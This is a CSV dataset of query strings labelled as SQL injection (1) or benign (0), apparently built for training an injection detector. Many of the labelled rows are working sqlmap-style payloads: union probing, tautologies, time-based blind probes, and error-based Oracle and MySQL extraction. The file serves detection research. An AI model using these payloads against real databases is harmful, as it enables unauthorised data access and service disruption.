Query,Label
"-9297 ) union all select 6841,6841,6841,6841,6841--",1
po29ip1t0l6,0
1 where 9361 = 9361 and 7478 = 9170--,1
4562,0
"1"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT * FROM massage WHERE split = 'face' LIMIT 3,0
philips@davidymamen.sa,0
"1"" ) where 6632 = 6632 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1
ruqiang,0
SELECT * FROM upon WHERE pool = excitement,0
"-9505' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'qhdg' = 'qhdg",1
"1"" where 5552 = 5552 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"1%' ) ) and make_set ( 6527 = 9529,9529 ) and ( ( '%' = '",1
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'kyos' like 'kyos",1
"select * from users where id = 1 -1<@ union select 1,version ( ) -- 1",1
SELECT full ( s ) FROM nor LEFT JOIN,0
39527,0
"SELECT * FROM cheese ORDER BY tone, personal",0
SELECT * FROM pie WHERE importance = 'anyway' AND ( leave = 'wise' OR policeman = 'no' ),0
"1 where 4331 = 4331 union all select null,null,null,null,null,null#",1
SELECT hunter ( s ) FROM tea UNION,0
"select * from generate_series ( 2317,2317,case when ( 2317 = 9706 ) then 1 else 0 end ) limit 1--",1
SELECT * FROM guard WHERE noted = 'sentence' AND ( did = 'fish' OR start = 'page' ),0
SELECT * FROM should WHERE box BETWEEN 10 AND 20,0
SELECT * FROM ( SELECT natural FROM run ),0
SELECT * FROM minute WHERE story = 'student' AND City = 'bill',0
"SELECT column_name ( s ) FROM equal,bet",0
alfa71ta,0
1' ) ) or sleep ( 5 ) and ( ( 'uzhd' like 'uzhd,1
"1' ) as vmmk where 5757 = 5757 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1"" ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""twpn"" like ""twpn",1
SELECT * FROM probably WHERE more LIKE '%desert%',0
"1' ) ) as oldh where 9551 = 9551 union all select null,null,null#",1
c7em,0
"1' ) where 9842 = 9842 union all select null,null,null,null,null,null,null,null#",1
SELECT * FROM taken WHERE NOT yesterday = 'saddle',0
SELECT * FROM word WHERE is BETWEEN education09/01/1996elephant AND twelve15/31/1996cut,0
1' ) as ulbr where 7233 = 7233 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1
3339,0
5695,0
SELECT * FROM herd WHERE my LIKE '%worse%',0
segundo,0
soule terraza,0
SELECT TOP 3 * FROM worth WHERE feathers = 'rubbed',0
"1%"" union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM limited WHERE leader = 'farmer',0
9654,0
SELECT AVG ( sign ) FROM burn,0
"1' ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
1' order by 1#,1
"1%' union all select null,null,null,null,null,null,null,null,null--",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 367845 ) ORDER BY meta_id ASC",0
"1"" ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ""mmvu"" = ""mmvu",1
"1 ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 4090 = 4090",1
"-7069 ) union all select 6638,6638,6638,6638,6638,6638--",1
retamal,0
lowietje,0
"1' ) ) ) and elt ( 9501 = 8427,8427 ) and ( ( ( 'ahpp' = 'ahpp",1
nagel ordoes,0
mahl iglesia,0
"1%"" ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,1
"-3707"" ) ) ) or 8571 = 8571--",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 185 ) ORDER BY meta_id ASC",0
clorosis,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 11710 ) ORDER BY meta_id ASC",0
antone1@tiendasyofertas.ve,0
1' ) where 6244 = 6244 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1
nagaraja,0
SELECT * FROM shade WHERE heading NOT BETWEEN 'straight' AND 'written',0
gierasch.casini@goovitae.cu,0
"1'|| ( select 'pzto' from dual where 7338 = 7338 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",1
threader,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 301 ) ORDER BY meta_id ASC",0
SELECT TOP 50 PERCENT * FROM instance SELECT * FROM widely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pack,0
0esino1o,0
SELECT * FROM entire FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM finish,0
palmario,0
"1"" or elt ( 6272 = 6272,sleep ( 5 ) )",1
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ""vzft"" = ""vzft",1
"1%"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ""%"" = """,1
SELECT * FROM those,0
SELECT * FROM grade FETCH FIRST 50 PERCENT ROWS ONLY,0
mantencin,0
cuenca,0
"1"" ) as zopq where 2680 = 2680",1
moriyama,0
SELECT * FROM cost 3 SELECT * FROM nor,0
SELECT * FROM Customers WHERE NOT Country = 'Germany';,0
1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'napi' like 'napi,1
SELECT * FROM everywhere WHERE color BETWEEN 'vapor' AND 'silent',0
"-9462"" ) as vzga where 4799 = 4799 or 8691 = 1048",1
SELECT * FROM gun ORDER BY part DESC,0
SELECT * FROM straw FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM behind,0
1839,0
hungkang,0
"1',iif ( 9496 = 4153,1,1/0 )",1
SELECT MIN ( twelve ) AS printed FROM automobile,0
1.45569E+15,0
"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""fkmh"" = ""fkmh",1
sagunto/sagunt,0
SELECT TOP 50 PERCENT * FROM brother,0
"1"" ) where 1410 = 1410",1
"1'+ ( select 'qzcx' where 9524 = 9524 and elt ( 3069 = 8430,8430 ) ) +'",1
SELECT AVG ( plan ) FROM aboard,0
35742173n,0
"1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'wqme' = 'wqme",1
"1"" ) ) as rpxd where 4929 = 4929",1
1'+ ( select 'rajp' where 3300 = 3300,1
"1"" ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""kzcd"" = ""kzcd",1
"1"" ) as xrsi where 9498 = 9498",1
85624451m,0
-9202' where 9799 = 9799 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1
"1 where 6077 = 6077 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
"1' where 5702 = 5702 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
-8812 or 6872 = 6872# dflr,1
SELECT AVG ( greatest ) FROM doctor SELECT SUM ( route ),0
SELECT AVG ( Price ) FROM income,0
if ( 4135 = 2165 ) select 4135 else drop function otyy--,1
"-5581%' ) ) ) union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",1
"SELECT pet,buried FROM ride WHERE anyone = 'wonder' UNION SELECT leaf, interest FROM bridge",0
"1' ) where 2121 = 2121 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
SELECT * FROM gather FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT AVG ( lion ) FROM this,0
"select sleep ( 5 ) and ""cyrb"" = ""cyrb",1
"1%"" and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""%"" = """,1
SELECT AVG ( tired ) FROM worker SELECT SUM ( rocket ),0
SELECT * FROM setting WHERE hearing BETWEEN angry09/01/1996pay AND such15/31/1996cold,0
albets vilar,0
"1"" where 7344 = 7344 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",1
SELECT * FROM dinner ORDER BY also DESC,0
SELECT sure FROM silent UNION SELECT sides FROM excellent ORDER BY wing,0
1 where 6223 = 6223 rlike sleep ( 5 ) #,1
SELECT * FROM habit,0
1' ) ) rlike ( select ( case when ( 3876 = 2077 ) then 1 else 0x28 end ) ) and ( ( 'hqcz' like 'hqcz,1
"1'|| ( select 'lxpg' where 7390 = 7390 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",1
nehemiah,0
1'+ ( select idnb where 2338 = 2338,1
"SELECT * FROM library WHERE slip IN ( 'vapor', 'tube', 'area' )",0
FROM ( SELECT DISTINCT gold FROM my ),0
1' ) ) ),1
"-1593' or elt ( 7044 = 6125,6125 ) and 'zkuz' = 'zkuz",1
SELECT * FROM does WHERE four = 'understanding' LIMIT 3,0
"-4480' ) where 4661 = 4661 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
SELECT * FROM chief WHERE morning LIKE '%force%',0
select pg_sleep ( 5 ) and ( ( 'enpn' like 'enpn,1
1%' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = ',1
6.60819E+15,0
prado de la guzpea,0
SELECT * INTO newtable [IN externaldb ] FROM oldtable WHERE condition ;,0
SELECT MIN ( planning ) AS wear FROM space,0
"1 ) ) as aeat where 1007 = 1007 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"select * from users where id = 1 union select 1`\`,version ( ) -- 1",1
"1"" ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
99020664y,0
sobrino coyoma,0
waitfor delay '0:0:5'#,1
SELECT COUNT ( took ) FROM sitting,0
1 ) where 3030 = 3030,1
FROM ( SELECT DISTINCT volume FROM try ),0
demarco_phuong@beesmer.me,0
"1' ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'bgdp' = 'bgdp",1
$despumar,0
tauja,0
"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1
extremosa,0
vinaixa calleiros,0
SELECT prevent ( s ) FROM saw,0
"iif ( 5571 = 4947,1,1/0 )",1
co*marca,0
descabellar,0
"' AND IF((SELECT SUBSTRING(@@version,1,1))='M', WAITFOR DELAY '0:0:5', 0) --",1
"1"" ) ) as ynuw where 9138 = 9138",1
19338,0
73361115q,0
"-3205"" ) union all select 5233,5233,5233,5233#",1
SELECT * FROM congress WHERE dirty = 'forward' LIMIT 3,0
"SELECT gas,tree FROM review WHERE question = 'today' UNION SELECT old, charge FROM average",0
"pi y margall 17, 7?f",0
78248698f,0
_bielda,0
"1%"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ""%"" = """,1
"SELECT * FROM here WHERE seven NOT IN ( 'mine', 'origin', 'future' )",0
-8999' ) ) ) or 6872 = 6872 and ( ( ( 'jare' = 'jare,1
"1' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 'cwjd' = 'cwjd",1
SELECT * FROM child WHERE NOT blow = 'flight',0
1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'ixzr' = 'ixzr,1
"1'|| ( select 'wcad' from dual where 4262 = 4262 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
"end and ( ( ( ""poee"" = ""poee",1
1 where 6518 = 6518,1
"1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 7244 = 7244",1
-7054 ) as gzvf where 9146 = 9146 or 3038 = 3038,1
SELECT * FROM fat 3 SELECT * FROM dead,0
"1' ) ) ) union all select null,null,null,null,null,null,null,null#",1
SELECT * FROM sum WHERE say = 'courage' FETCH FIRST 3 ROWS ONLY,0
2111,0
"admin"" or 1 = 1",1
kussauer_brereton@showcarsmadrid.com.kp,0
"-5572"" ) union all select 8131,8131#",1
SELECT damage ( s ) FROM during FULL OUTER JOIN,0
"1%' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT * FROM greatest WHERE tank = 'grow' AND City = 'upper',0
"1%"" ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"1' where 1085 = 1085 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
SELECT machine,0
"1%"" ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1 ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 3003 = 3003",1
"SELECT rocky AS compound, chosen AS [lady] FROM key",0
-8876' ) ) or 3038 = 3038,1
"SELECT ship,thread FROM different WHERE himself = 'remove' UNION SELECT was, circus FROM alike",0
"1"" ) where 1212 = 1212 and 8475 = 5864",1
mahecha barguo,0
"1"" ) and ( 5452 = 6050 ) *6050 and ( ""ciyc"" like ""ciyc",1
SELECT * FROM east WHERE tightly = 'lady' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( my ) FROM wheel,0
-8301' ) ) ) or ( 5708 = 5268 ) *5268 and ( ( ( 'hkha' = 'hkha,1
"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1
SELECT TOP 3 * FROM sharp SELECT * FROM quarter 3SELECT * FROM football,0
1' where 3362 = 3362,1
1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ),1
9.7668E+15,0
45810,0
dirck,0
SELECT * FROM younger WHERE build = 'rising' OR leather = 'animal',0
1' ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 'zjun' = 'zjun,1
-7532 ) ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 8332 = 8332,1
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 8126 = 8126",1
7.02E+15,0
SELECT * FROM salt WHERE NOT stage = 'examine' AND NOT day = 'alphabet',0
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""%"" = """,1
humaina,0
"-3954' ) ) union all select 2417,2417--",1
siede@comodepilarse.ye,0
"-8777"" ) as lalf where 8606 = 8606 or elt ( 4397 = 5823,5823 ) --",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c82a3dbb22' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
navas de jorquera,0
"SELECT fifth,spirit,travel,color,running ( ( finger JOIN command ON mouse.bone = house.entirely ) INNER JOIN lakeON Orders.go = mysterious.consistID )",0
42462633x,0
"1' in boolean mode ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
SELECT * FROM aboard WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM barn WHERE express BETWEEN 'original' AND 'bit',0
SELECT joy ( s ) FROM general UNION ALL,0
"1"" where 1132 = 1132 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --",1
SELECT * FROM accurate WHERE branch BETWEEN 'handsome' AND 'although',0
SELECT COUNT ( secret ) FROM beside,0
"1%"" ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ""%"" = """,1
1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1
"1"" ) ) ) union all select null,null,null,null,null,null,null--",1
49439340n,0
graciano,0
"-2948' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 'ivwt' = 'ivwt",1
ausent+e,0
doerksen,0
SELECT AVG ( flight ) FROM individual,0
rasifo,0
SELECT * FROM book WHERE engineer BETWEEN heart09/01/1996want AND girl15/31/1996family,0
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""bkoq"" = ""bkoq",1
thorndik9,0
"SELECT * FROM good WHERE at NOT IN ( 'share', 'kids', 'frozen' )",0
beninger,0
lurlene,0
"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'qdhz' = 'qdhz",1
"-1692' ) union all select 7074,7074,7074,7074,7074,7074,7074#",1
"-5496 union all select 2099,2099,2099#",1
SELECT * FROM themselves WHERE NOT nervous = 'start' AND NOT cow = 'captured',0
-2504' ) ) ) or 8723 = 9715,1
SELECT AVG ( bark ) FROM minerals SELECT SUM ( brown ),0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""xxug"" = ""xxug",1
"-3963"" or 1224 = 5119",1
wicht,0
"calle antequeruela, 94, 7-a",0
476en9o9na5,0
SELECT * FROM lost 3,0
"1"" ) where 3390 = 3390",1
arriharn espinet,0
"SELECT * FROM alone ORDER BY mind, two",0
declare @s varchar ( 200 ) select @s = 0x73656c6 ...,1
"-3633' ) where 3513 = 3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",1
"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1
55341505d,0
1' where 7882 = 7882 and 6663 = 4524--,1
"1' ) where 3262 = 3262 union all select null,null,null,null,null,null,null,null,null,null#",1
4.61189E+15,0
-8710 or 9323 = 9323#,1
select * from users where id = 1 % ( $ ) or 1 = 1 -- 1,1
"1%"" union all select null,null--",1
zaharoff0,0
x' or full_name like '%bob%,1
"select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",1
22618043g,0
"calle ribadeo 78,",0
"1' and elt ( 1533 = 5695,5695 ) and 'ycgi' = 'ycgi",1
"select benchmark ( 5000000,md5 ( 0x714e4153 ) ) #",1
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 'nslo' like 'nslo",1
SELECT * FROM poetry,0
15423399j,0
1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'uqfs' = 'uqfs,1
"iif ( 1746 = 1730,1,1/0 )",1
"1%' ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( '%' = '",1
SELECT * FROM stick WHERE natural LIKE '%anything%',0
SELECT MIN ( bus ) AS bus FROM build,0
SELECT Count ( * ) AS primitive,0
5123,0
select case when 2095 = 9074 then 1 else null end--,1
SELECT * FROM discover WHERE every = married,0
695,0
satandera,0
516?t2r8ro,0
SELECT form ( s ) FROM grown,0
"SELECT verb,blind,loss FROM hit LEFT JOIN Orders ON shore.careID = string.water ORDER BY first.strike",0
SELECT SIN ( 2 ) ;,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ""weku"" like ""weku",1
"SELECT * FROM general ORDER BY clean ASC, supper DESC",0
ribadumia,0
